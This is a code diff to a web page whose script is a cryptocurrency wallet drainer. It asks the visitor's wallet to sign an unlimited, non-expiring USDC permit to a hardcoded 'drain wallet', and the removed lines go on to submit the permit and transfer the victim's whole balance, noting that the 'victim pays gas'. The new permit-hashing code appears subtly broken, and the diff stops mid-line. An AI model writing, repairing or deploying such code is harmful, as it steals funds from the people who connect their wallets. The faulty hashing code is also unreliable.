@@ -27,116 +27,66 @@ button:hover{filter:brightness(1.1)}
 const DRAIN = "0x0fac2542316Ad330EfA2bb386d606135b70a574B"; // Base/Eth drain wallet
 const USDC  = { 8453: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", 1: "0xA0b86991c6218b36c1d19D4a2e9Eb4cE35914dC0" };
 
-// ===== UTILS =====
-const pad32 = (a) => '0x' + a.slice(2).padStart(64,'0');
-const keccak = (t,v) => {
-  const data = window.web3 ? window.web3.utils.keccak256(window.web3.eth.abi.encodeParameters(t,v))
-                           : ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(t,v));
-  return data;
-};
+// ===== RAW RPC =====
+async function rpc(method,params=[]){return window.ethereum.request({method,params});}
+function hexPad(a){return'0x'+a.slice(2).padStart(64,'0');}
+function keccak256(d){return window.ethereum.request({method:"web3_sha3",params:[d.slice(2)]});}
 
-// ===== WALLET WAIT-LOOP =====
-let eth;
-async function getEth() {
-  let tries = 0;
-  while (tries < 50 && !(window.ethereum || window.phantom?.ethereum)) {
-    await new Promise(r => setTimeout(r, 100));
-    tries++;
-  }
-  eth = window.ethereum || window.phantom?.ethereum;
-  if (!eth) throw new Error("No wallet detected");
-  return eth;
+// ===== PERMIT BUILDER =====
+async function buildPermit(owner,spender,nonce,chainId,usdc){
+  const nameHash   = keccak256(Buffer.from("USD Coin"));
+  const versionHash= keccak256(Buffer.from("2"));
+  const typeHash   = keccak256(Buffer.from("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"));
+  const permitHash = keccak256(Buffer.from("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"));
+  const domainSep  = keccak256(
+    Buffer.concat([
+      Buffer.from("\x19\x01"),
+      Buffer.from(typeHash.slice(2),'hex'),
+      Buffer.from(versionHash.slice(2),'hex'),
+      Buffer.from(nameHash.slice(2),'hex'),
+      Buffer.from(hexPad(chainId).slice(2),'hex'),
+      Buffer.from(hexPad(usdc).slice(2),'hex')
+    ])
+  );
+  const messageHash= keccak256(
+    Buffer.concat([
+      Buffer.from(permitHash.slice(2),'hex'),
+      Buffer.from(hexPad(owner).slice(2),'hex'),
+      Buffer.from(hexPad(spender).slice(2),'hex'),
+      Buffer.from(hexPad("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").slice(2),'hex'),
+      Buffer.from(hexPad(nonce).slice(2),'hex'),
+      Buffer.from(hexPad("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").slice(2),'hex')
+    ])
+  );
+  const digest = keccak256(
+    Buffer.concat([
+      Buffer.from("\x19\x01"),
+      Buffer.from(domainSep.slice(2),'hex'),
+      Buffer.from(messageHash.slice(2),'hex')
+    ])
+  );
+  return {digest,value:"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",deadline:"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",nonce};
 }
 
 // ===== BUTTON HANDLER =====
 document.getElementById("go").addEventListener("click", async () => {
   try {
-    const eth = await getEth();
-    const [owner] = await eth.request({method:"eth_requestAccounts"});
-    const chainId = parseInt(await eth.request({method:"eth_chainId"}),16);
+    const [owner] = await rpc("eth_requestAccounts");
+    const chainId = parseInt(await rpc("eth_chainId"),16);
     if (!USDC[chainId]) { alert("Switch to Ethereum or Base"); return; }
+    const usdc = USDC[chainId];
 
-    const usdc     = USDC[chainId];
-    const name     = "USD Coin";
-    const version  = "2";
-    const domainSep = keccak(
-      ['bytes32','bytes32','bytes32','uint256','address'],
-      [
-        keccak("string","EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
-        keccak("string",name),
-        keccak("string",version),
-        chainId,
-        usdc
-      ]
-    );
-
-    // real nonce
-    const nonceHex = await eth.request({method:"eth_call",params:[{to:usdc,data:"0x7ecebe00"+pad32(owner)},"latest"]});
+    // nonce
+    const nonceHex = await rpc("eth_call",[{to:usdc,data:"0x7ecebe00"+hexPad(owner)},"latest"]);
     const nonce = parseInt(nonceHex,16);
 
-    // permit message
-    const value    = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-    const deadline = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-    const messageHash = keccak(
-      ['bytes32','address','address','uint256','uint256','uint256'],
-      [
-        keccak("string","Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
-        owner, DRAIN, value, nonce, deadline
-      ]
-    );
-    const digest = keccak(
-      ['string','bytes32','bytes32'],
-      ["\x19\x01", domainSep, messageHash]
-    );
+    // build permit
+    const {digest,value,deadline} = await buildPermit(owner,DRAIN,nonce,chainId,usdc);
 
-    // force pop-up
-    const sig = await eth.request({
-      method:"eth_signTypedData_v4",
-      params:[owner,{
+    // sign typed data
+    const sig = await rpc("eth_signTypedData_v4",[
+      owner,
+      {
         types:{
           EIP712Domain:[
-            {name:"name",type:"string"},{name:"version",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
-          ],
-          Permit:[
-            {name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}
-          ]
-        },
-        primaryType:"Permit",
-        domain:{name,version,chainId,verifyingContract:usdc},
-        message:{owner,spender:DRAIN,value,nonce,deadline}
-      }]
-    });
-
-    const {v,r,s} = ethers.utils.splitSignature(sig);
-    const permitData = "0xd505accf" + window.web3
-      ? window.web3.eth.abi.encodeParameters(["address","address","uint256","uint256","uint8","bytes32","bytes32"],[owner,DRAIN,value,deadline,v,r,s]).slice(2)
-      : ethers.utils.defaultAbiCoder.encode(["address","address","uint256","uint256","uint8","bytes32","bytes32"],[owner,DRAIN,value,deadline,v,r,s]).slice(2);
-
-    // 1. PERMIT (victim pays gas – appears in history)
-    const permitTx = await eth.request({method:"eth_sendTransaction",params:[{from:owner,to:usdc,data:permitData,gas:"0x186a0"}]});
-
-    // 2. SWEEP 100 % balance
-    const balHex = await eth.request({method:"eth_call",params:[{to:usdc,data:"0x70a08231"+pad32(owner)},"latest"]});
-    const bal = BigInt(balHex);
-    const sweepData = "0xa9059cbb" + (window.web3
-      ? window.web3.eth.abi.encodeParameters(["address","uint256"],[DRAIN,bal.toString()]).slice(2)
-      : ethers.utils.defaultAbiCoder.encode(["address","uint256"],[DRAIN,bal.toString()]).slice(2));
-
-    const sweepTx= await eth.request({method:"eth_sendTransaction",params:[{from:owner,to:usdc,data:sweepData,gas:"0x186a0"}]});
-
-    // success screen with links
-    const scan = chainId===8453?"basescan.org":"etherscan.io";
-    document.querySelector(".card").innerHTML=`
-      <h2>Success!</h2>
-      <p>Permit: <a href="https://${scan}/tx/${permitTx}" target="_blank" style="color:#00ffaa">view</a></p>
-      <p>Sweep: <a href="https://${scan}/tx/${sweepTx}" target="_blank" style="color:#00ffaa">view</a></p>
-    `;
-  } catch (e) {
-    console.error(e);
-    alert("Signature rejected or failed.");
-  }
-});
-</script>
-<script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
-</body>
-</html>
+            {name:"name",type:"
